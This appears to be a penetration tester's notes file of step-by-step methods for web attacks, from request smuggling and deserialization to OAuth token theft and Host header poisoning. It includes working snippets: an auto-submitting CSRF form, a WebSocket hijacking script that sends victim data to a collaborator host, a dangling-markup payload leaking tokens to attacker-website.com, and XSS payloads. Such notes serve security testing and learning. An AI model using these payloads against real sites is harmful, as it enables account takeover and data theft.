-- -
# HTTP Request Smuggling

Step 1: Right-click on FQDN -> Smuggle Probe
Step 2: If found, left-click on the "Issue" -> left-click on the "Request 1" tab -> select CL.TE or TE.CL
    (If the vuln is found on multiple directories, expand and click on the correct path)
Step 3: Edit prefix to meet payload requirements
Step 4: Attack
a
# De-serialization

## Black-Box
Step 1: Identify language application is written in -> Understand how data is serialized in that language
    - PHP -- O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}
    - Java -- Object begins with "ac ed" (Hex) or "rO0" (Base64)
    - Ruby -- 
Step 2: Find serialized data that can be controlled by user input
Step 3: Choose the best method of attack
    1. Edit object directly in it's byte stream form
    2. Write a script in the noted language to create and serialize an object yourself
    3. Use an existing tool:
        - PHP -- PHPGCC
            ~ Function calls: exec | system
            ~ ./phpgcc [PAYLAOD] [PARAMETERS] | base64 -w 0 | xclip -selection clipboard
            ~ Add encoded payload and secret key (from phpinfo()) to sha1-hmac-generator.php (URL)
        - Java -- ysoserial
            ~ Payload should be URL encoded (whole payload) when sending through vulnerable cookie
        - Ruby -- 


## White-box
Step 1: Parse source code for keywords:
    - PHP -- serialize() | unserialize()
    - Java -- java.io.Serializable | readObject() | InputStream



# Prototype Poisoning

Step 1: Identify vulnerability with payload/scanner
Step 2: Find vulnerable gadgets
    - Fingerprint.js -- https://gist.github.com/nikitastupin/b3b64a9f8c0eb74ce37626860193eaec
    - Wappalyzer
    - BuiltWith
Step 3: If no vulnerable gadgets found -> check Untrusted-Types plugin in Dev Tools Console


# Server-Side Template Injection

Step 1: Identify vulnerability
    - Reflected input -> no XSS vuln (no output/encoded tags/error message) -> break out using templating syntax (http://vulnerable.com/?greeting=data.username}}<tag>)
        ~ If theres no change, either wrong templating syntax is used or page isn't vulnerable
    - Custom BurpBounty template to test for solution to mathmatical operation in response (EX: http://vulnerable.com?greeting=${7*7} -> Check response for '49')
Step 2: Identify template engine
    - https://portswigger.net/web-security/images/template-decision-tree.png
Step 3: Exploit vulnerability

## oAuth

## Steps of OAuth

### Authorization Code

1. Authorization Request
    - Common parameters: redirect_uri/response_type/scope/state
    EX: 
        GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=code&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
        Host: oauth-authorization-server.com 
2. User Consent
3. Authorization Code Grant
    - Common parameters: code/state
    - Vulnerable to CSRF
    EX:
        GET /callback?code=a1b2c3d4e5f6g7h8&state=ae13d489bd00e3c24 HTTP/1.1
        Host: client-app.com 
4. Access Token Request
    - Common parameters: client_secret/grant_type/client_id/redirect_uri/code
    EX: 
        POST /token HTTP/1.1
        Host: oauth-authorization-server.com
        …
        client_id=12345&client_secret=SECRET&redirect_uri=https://client-app.com/callback&grant_type=authorization_code&code=a1b2c3d4e5f6g7h8 
5. Access token grant
    - Server responds with Bearer Token
6. API call
    - Contains Authorization header w/ Bearer Token
7 Resource grant
    - Server responds with sensitive data


Step 1: Search traffic for known OAuth parameters
    - client_id
    - redirect_uri
    - response_type
    - state
Step 2: Send GET request to known OAuth Service Provider endopints
    - /.well-known/oauth-authorization-server
    - /.well-known/openid-configuration
Step 3: Identify Grant Type (response_type parameter)
    - Authorization Code -- response_type=code
    - Implicit -- response_type=token (More common in SPAs and Desktop Apps)
Step 4: Identify misconfigurations that can be abused
    - Implicit -- All data in POST request not validated when establishing session
    - Authorization Code -- No state parameter used -> CSRF (most impact when linking accounts)
    - Authorization Code / Implicit -- Steal code/token through redirect_uri
        ~ There are several redirect possibilities:
            1. Redirect to any domain
            2. Redirect to any subdomain
            3. Redirect to specific domains
            4. Redirect to one domain, all paths
            5. Redirect to one domain, specific paths
            6. Redirect to one domain, one path
            7. Redirect to whitelisted domains and/or paths based on Regex
            8a. Can add parameters
            8b. Can add specific parameters
            8c. Cannot add parameters
            **Note: Try using parameter pollution, SSRF/CORS defense bypass techniques, localhost.evil-server.net, etc.
        Step 1: Send malicious url with poisoned redirect_uri parameter
        Step 2: Read code/token in response
        Step 3: Substitute stolen code/token when logging in
        **Note: If redirect_uri parameter is sent with code/token, server is likely not vulnerable 
        ~ Steal parameter data from hash fragments:
        <script>
            if (document.location.hash){
                console.log("Hash identified -- redirecting...");
                window.location = '/?'+document.location.hash.substr(1);
            } else {
                console.log("No hash identified in URL");
            }
        </script>
    - Upgrade scope to access protected resources (depends on grant type):
        ~ Authorization Code:
            Step 1: Register a malicious application with the OAuth server
            Step 2: Victim approves limited scope
            Step 3: Malicious application sends POST request to /token with expanded scope
            Result: If the OAuth server does not validate the scope with the original request, the access token returned will have an expanded authorization
        ~ Implicit:
            Step 1: Steal access token
            Step 2: Manually send access token with expanded scope
            Result: If the OAuth server does not validate the scope with the original request, the access token returned will have an expanded authorization
    - Sign up with victim's email to get account takeover

## OpenID Connect w/ OAuth

- Uses JWT (id_token)
- Keys can be exposed on /.well-known/jwks.json
- Configuration can be exposed on /.well-known/openid-configuration
- Can be combined with normal OAuth grant Types
    EX: response_type=id_token token || response_type=id_token code

Step 1: Check for dynamic registration (is some form of authentication required, like a Bearer token?)
Step 2: Craft a malicious registration payload for SSRF


# CSRF

Step 1: Identify 3 conditions:
    1. Relevant Action - Action in the application the attacker wishes to induce
    2. Cookie-based Session Handling - Self explanitory (No Authorization Headers!)
    3. No Unpredictable Request Parameters - CSRF Token / Must know current password to change
Step 2: Build malicous page to exploit
    - Custom:
    <html>
        <body>
            <form action="https://vulnerable-website.com/email/change" method="POST">
                <input type="hidden" name="email" value="pwned@evil-user.net" />
            </form>
            <script>
                document.forms[0].submit();
            </script>
        </body>
    </html> 
    - Burp:
        1. Select Targeted Request
        2. Right-click -> Engagement Tools -> Generate CSRF PoC
        3. Customize generated PoC as needed
        4. Host in AWS


# WebSockets

- WebSocket messages can be intercepted in Burp just like HTTP/HTTPS requests
- Set Client-to-Server or Server-to-Client in the Options tab
- Manipulate WebSocket handshake:
    Why?
        ~ Expand attack surface (most important)
        ~ Attack may close your established connection
        ~ Token expires
    Step 1: Burp Repeater -> "Pencil Icon" next to the WebSocket URL
    Step 2: Choose to clone or reconnect
    Step 3: Edit connection as needed
    Step 4: Click "Connect" to initiate handshake
- Identify design flaws:
    ~ Misplaced trust in HTTP security headers
    ~ Flaws in session handling
    ~ Expanded attack surface w/ custom HTTP headers
- Cross-Site WebSocket Hijacking (CSWSH):
    ~ Identify HTTP WebSocket handshake that does not have CSRF or other unpredictable token
    ~ Session must be established through cookie, just like CSRF
    ~ Sec-WebSocket-Key header DOES NOT perform authentication or session handling
    ~ Malicious Application:
        <script>
            websocket = new WebSocket('wss://your-websocket-URL')
            websocket.onopen = start
            websocket.onmessage = handleReply
            function start(event) {
                websocket.send("READY");
            }
            function handleReply(event) {
                fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
            }
        </script> 

# HTTP Host Header Attacks

- Reasons for multiple applications being hosted on a single IP address:
    1. Virtual Hosting (VHosting)
        ~ Multiple apps with a single owner
        ~ Multiple apps with multiple owners (Most commonly SaaS)
    2. Traffic Routed through Intermediary
        ~ Apps hosted on back-end servers
        ~ Traffic routed through load balancer or reverse proxy server
        ~ Very common when app is accessed through Content Delivery Network (CDN)
- What happens when you make an HTTP request in a browser?
    1. Browser sends URL to DNS server, which responds with IP Address
    2. Browser sends HTTP request to IP Address that contains Host Header
    3. Web Server routes request to corresponding application based on Host Header
- Possible vulnerabilities that can be exploited:
    ~ Web Cache Poisoning
    ~ Business Login Flaws
    ~ SSRF
    ~ Client-side Vulns (XSS, SQLi, HTMLi, etc.)

## Testing for HTTP Host Header Attacks

Step 1: Identify vulnerable application
    - Supply arbitrary domain name in host header
        If you can still access app with arbitrary domain name:
            ~ Server may default to your target app when an unrecoginized domain name is sent
            ~ You can now work to identify what the host header does and how it can be exploited
        Else:
            ~ Did the server respond with "Invalid Host header"?
            ~ Was the request blocked due to security controls?
            ~ Can you add a non-numeric port? (Host: vulnerable-website.com:bad-stuff-here)
            ~ How can you manipulate the header to bypass controls? (think SSRF)
    - Send duplicate Host headers
        ~ Will most likely be blocked, but not always
        EX:
            GET /example HTTP/1.1
            Host: vulnerable-website.com
            Host: bad-stuff-here
    - Send an absolute URL in the request line
        Ex:
            GET https://vulnerable-website.com/ HTTP/1.1
            Host: bad-stuff-here 
    - Can you use spacing to bypass validation filters?
        Ex (note the space before the first Host header):
            GET /example HTTP/1.1
             Host: bad-stuff-here
            Host: vulnerable-website.com
    - Can you combine this attack with HTTP Request Smuggling?
    - If none of these techniques work, try other headers that are commonly used in place of the Host header
        EX: 
            GET /example HTTP/1.1
            Host: vulnerable-website.com
            X-Forwarded-Host: bad-stuff-here
        ~ X-Forwarded-Host
        ~ X-Host
        ~ X-Forwarded-Server
        ~ X-HTTP-Host-Override
        ~ Forwarded
        ~ Burp's Param Miner extension can be used to guess additional headers
Step 2: Identify ways to exploit vulnerable application
    - Password Reset Poisoning
        ~ Attacker forces the vulnerable app to send password reset link to domain under their controlled
        ~ URL sent to the user is dynamically generated based on user controlled input
        Step 1: Obtain victim email/username required to reset password
        Step 2: Submit the reset password form with the Host header set to a domain the attacker controls
        Step 3: Victim receives password reset email with poisoned URL
        Step 4: Victim clicks the link (or link is fetched another way), sending reset token to attacker's server
        Step 5: Sttacker visits real URL and uses stolen token to reset password
        **Note: If you cannot manipulate the reset link, try HTMLi to manipulate the email itself and add your owner
    - (More to come)


# Advanced XSS
- Cheat Sheet -- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

## Three Types
- Reflected -- Malicious script comes from current HTTP Request
- Stored -- Malicous script comes from the application's database
- DOM -- Vulnerability exists in the client-side code

## DOM-based XSS
- Vulnerable pages take user-controlled data (source) and pass it to a function that supports dynamic code execution (sink)
- Common Sources:
    window.location (URL)
    location.search
    location.hash
    document.URL
    document.documentURI
    document.URLUnencoded
    document.baseURI
    location
    document.cookie
    document.referrer
    window.name
    history.pushState
    history.replaceState
    localStorage
    sessionStorage
    IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
    Database
- Common Sinks:
    document.write()
        ~ Works with <script>
    document.writeln()
    document.domain
    someDOMElement.innerHTML
        ~ Works with <img> or <iframe>
    someDOMElement.outerHTML
    someDOMElement.insertAdjacentHTML
    someDOMElement.onevent
    add()
    after()
    append()
    animate()
    attr()
        ~ Works with HTML tags that can use the href attribute
        ~ Example: Set return URL to javascript:alert('XSS')
    insertAfter()
    insertBefore()
    before()
    html()
    prepend()
    replaceAll()
    replaceWith()
    wrap()
    wrapInner()
    wrapAll()
    has()
    constructor()
    init()
    index()
    jQuery.parseHTML()
    $.parseHTML()
- Testing for Sinks:
    ~ HTML Sinks -- Easy
        1. Send MD5 sum through the source
        2. Search HTML in Dev Tools for MD5 sum (Ctrl + F)
        3. Refine payload to deliver attack
    ~ JavaScript Execution Sinks -- Hard
        4. Search JavaScript code for any sources being referenced (Ctrl + Shift + F)
        5. Add breakpoints and manually follow how the source's value is being used
        6. If source's value is assigned to a variable, search for how that variable is used
        7. If that variable is passed to a sink, hover over the variable to show it's value before it's passed to the sink
        8. Refine payload to deliver attack
- Angular
    ~ Look for the "ng-app" attribute
    ~ All JavaScript enclosed in the HTML tags labelled ng-app will be run automatically by Angular
    Payload: {{$on.constructor('alert(1)')()}}
- When JavaScript eval() method evaluates a JSON object
    Payload: \"-alert(1)}//

## Contexts
- Between HTML tags
    EX: <p>[USER CONTROLLED INPUT]</p>
    ~ Attacker must introduce new HTML tags to trigger JavaScript
    Step 1: Fuzz for HTML tags filtered by WAF
    Step 2: Fuzz for attributes/events filtered by WAF
    Step 3: Fuzz for payloads filtered by WAF
    Step 4: Build working payload based on whitelisted tag, attr, and payload

## Bypassing Content Security Policy (CSP)

Common CSP Controls:
    - Content-Security-Policy Header:
        ~ script-src 'self' -- Only scripts from the same origin domain can be loaded
        ~ script-src https://scripts.normal-website.com -- Only scripts from a specific domain can be loaded
    - Nonce (random value):
        ~ Same value must be used in the script tag, otherwise the script won't execute
        ~ Must be securely generated each time the page loads
        ~ Must not be guessable
    - Hash (hash value of script being loaded)
        ~ Script will not load if it is changed since the hash will no longer match
- Most CSPs don't block <img> tags 
- Dangling Markup Injection can be used to bypass CSP
    ~ Inject HTML tags with open attr quotes so sensitive data (CSRF Token) is sent to attacker's server
    Step 1: Identify name of input field to exploit
    Step 2: Add GET parameter in URL with corresponding name
    Step 3: Value of malicious parameter will be the payload
    **IMPORTANT NOTES**
    - Send request through Repeater, then "Show Response in Browser"
    - Single vs Double quote is VERY important.  Double quote will end on next double quote and vice-versa
    EX:
        <input type="text" name="input" value="[PAYLOAD]"/>
        [PAYLOAD] = "><img src='//attacker-website.com?
        Resulting HTML: <input type="text" name="input" value=""><img src='//attacker-website.com?[SENSITIVE DATA]"/>

## AWS S3 Buckets

1. Find Open S3 Bucket
2. Search for:
    - sql
    - sql.gz
    - backup.zip
    - backup.gz
    - backup.tar
    - backup.tar.gz
    - Any other file that may be valuable
S3Scanner:
    - Source: https://github.com/sa7mon/S3Scanner
    - Install:
        git clone git@github.com:sa7mon/S3Scanner.git
        cd S3Scanner
        pip3 install -r requirements.txt
        python3 -m S3Scanner

=======
# 403/401 Testing
>>>>>>> 58346f9e02f7ab84175146548fc018baa43b4682
